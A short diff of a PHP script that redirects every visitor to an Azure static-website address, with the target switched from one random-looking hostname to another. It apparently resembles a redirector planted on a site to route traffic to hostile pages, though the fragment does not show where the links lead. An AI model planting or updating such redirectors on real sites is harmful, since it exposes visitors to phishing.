@@ -2,7 +2,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://scrappss8ucore.z13.web.core.windows.net/");
+header("Location: https://capcorenewxxx.z8.web.core.windows.net/");
  
 exit;
 ?>
